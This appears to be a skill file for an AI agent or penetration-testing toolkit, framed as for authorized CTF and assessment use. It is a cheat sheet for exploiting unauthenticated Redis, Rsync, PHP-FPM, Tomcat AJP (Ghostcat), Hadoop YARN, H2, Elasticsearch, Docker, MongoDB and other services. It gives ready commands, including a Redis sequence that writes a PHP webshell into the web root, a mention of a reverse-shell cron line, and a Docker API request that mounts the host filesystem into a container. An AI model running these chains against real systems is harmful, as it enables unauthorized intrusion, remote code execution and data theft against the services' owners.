name: unauthorized-access
description: Unauthorized access to common exposed services — Redis/Rsync/PHP-FPM/AJP(Ghostcat)/Hadoop YARN/H2 Console/Elasticsearch/MongoDB/Docker. Each entry gives the port, the quick check, and the RCE/data path. Use when a port scan shows a management/infra service open with no auth.
---

# Unauthorized Access to Common Services

Authorized CTF/assessment use. Infra services left unauthenticated are the fastest wins in a network challenge. Spot the port, send the one-liner, escalate to RCE or dump. These are often reachable directly OR via SSRF (see ssrf-attack skill).

## 1. Port → service → check → impact

| Port | Service | Quick check / exploit |
|---|---|---|
| 6379 | Redis | `redis-cli -h T info` (no auth) → write webshell/cron via `CONFIG SET dir/dbfilename` + `SAVE`; or master-slave RCE |
| 873 | Rsync | `rsync rsync://T/` list modules → `rsync -av rsync://T/module/` download (steal files/flag) |
| 9000 | PHP-FPM | FastCGI `SCRIPT_FILENAME` + auto_prepend_file → arbitrary PHP exec |
| 8009 | AJP (Tomcat) | **Ghostcat** — read `/WEB-INF/web.xml` and any class/config file |
| 8088 | Hadoop YARN | POST a job to `/ws/v1/cluster/apps` with a command → cluster RCE |
| 8082 | H2 Console | JNDI connection string → RCE (`jdbc:h2:mem:...;INIT=...`) |
| 9200 | Elasticsearch | `/_cat/indices`, `/INDEX/_search?q=*` → dump data/flag |
| 2375 | Docker API | `/v1.24/containers/json`; create privileged container mounting `/:/host` → host root |
| 27017 | MongoDB | `mongodb://T/` no auth → `show dbs` → dump collections |
| 11211 | Memcached | `memcstat`/`memcdump` → read cached sessions/data |
| 1099 | Java RMI | ysoserial JRMP gadget → deserialization RCE |

## 2. The highest-value chains

**Redis (6379) unauth → RCE:** if it's writable, write a webshell or cron:
```
redis-cli -h T
  CONFIG SET dir /var/www/html
  CONFIG SET dbfilename shell.php
  SET x "<?php system(\$_GET[c]);?>"
  SAVE
```
(or `CONFIG SET dir /var/spool/cron` + a reverse-shell cron line). If `CONFIG` is disabled, try the master-slave module-load RCE.

**Docker API (2375) → host root:**
```
curl -s http://T:2375/v1.24/containers/json
POST /containers/create {"Image":"alpine","Cmd":["cat","/flag"],"HostConfig":{"Binds":["/:/host"]}}
```

**AJP Ghostcat (8009):** read config/JSP source → find DB creds / flag path.

**Elasticsearch (9200):** `/_search?q=*` dumps everything — grep for the flag.

## 3. Discovery

```bash
nmap -sV -p 6379,873,9000,8009,8088,8082,1099,9200,5984,2375,27017,11211 TARGET
```
Any of these open + answering without auth = a candidate. If the box is behind a firewall but has SSRF, reach them through the SSRF endpoint instead.

## Cross-cutting
- **One open unauth service can be the whole solve** — don't skip infra ports chasing a web bug.
- **Redis and Docker are the two instant-RCE ones** — check them first.
- Self-verify each (banner/list output) before escalating to write/RCE.
